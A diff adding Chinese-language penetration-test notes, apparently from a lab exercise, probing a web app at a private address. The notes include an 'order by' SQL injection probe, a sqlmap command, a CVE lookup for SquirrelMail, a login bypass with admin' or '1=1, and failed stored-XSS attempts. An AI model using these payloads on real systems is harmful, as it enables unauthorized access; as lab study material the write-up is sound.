@@ -122,3 +122,95 @@ id可能是个注入点
 /var/www/html/pages/
 ```
 
+使用语句测出
+
+```
+http://172.16.12.102/index.html?page=blog&title=Blog&id=2 order by 1
+```
+
+![image-20220123021946893](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123021946893.png)
+
+直接sqlmap跑一下就出来了
+
+```
+python sqlmap.py -u "http://172.16.12.102/index.html?page=blog&title=Blog&id=2"
+```
+
+![image-20220123022512477](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123022512477.png)
+
+Apache版本 2.2.0，PHP版本5.1.2，Mysql版本5.0.12
+
+## 邮件页面看看有什么操作
+
+![image-20220123023229096](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123023229096.png)
+
+SquirrelMail版本是1.4.17，上网搜一搜
+
+> PHP邮件Squirrelmail远程代码执行漏洞CVE-2017-7692 1.4.22以下版本均受影响
+
+可以对其测试
+
+相关poc
+
+## calendar页面看看有什么操作
+
+![image-20220123023902902](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123023902902.png)
+
+选年月的位置是否可以注入，查看源代码发现是链接页面，可能存在注入
+
+搜索界面有没有xss
+
+登陆界面sql注入或其他
+
+选月份后
+
+```
+http://172.16.12.102/calendar/index.php?action=display&year=2022&month=2
+```
+
+![image-20220123024050589](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123024050589.png)
+
+可以看到有报错，遇到了不完善的数值，判断存在数值类型转换
+
+在登陆页面
+
+利用admin'登陆测试，发现报错
+
+![image-20220123025032920](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123025032920.png)
+
+```sql
+SELECT uid FROM phpc_users
+WHERE username = 'admin'' AND password = 'c4ca4238a0b923820dcc509a6f75849b' AND calendar = '0'
+```
+
+在phpc_users表中选出uid
+
+sql语句被报错显示出，单引号没被过滤可以测试
+
+> 账号：admin' or '1=1
+>
+> 密码：任意
+
+登陆成功
+
+![image-20220123025243499](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123025243499.png)
+
+![image-20220123025304560](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123025304560.png)
+
+创建两个新用户尝试，12和12'#查看能否修改密码，其中'#使用url编码
+
+事实发现，随便用个账号登陆就是admin账户= =
+
+在账户设置处，有日历标题选项，可以测试存储性xss
+
+![image-20220123025924957](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123025924957.png)
+
+![image-20220123025956596](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123025956596.png)
+
+将Anonymous Permission权限改为可以修改和添加日程
+
+测试日程处的存储型xss
+
+![image-20220123030336225](https://raw.githubusercontent.com/lant34m/pic/main/img/image-20220123030336225.png)
+
+弹出失败
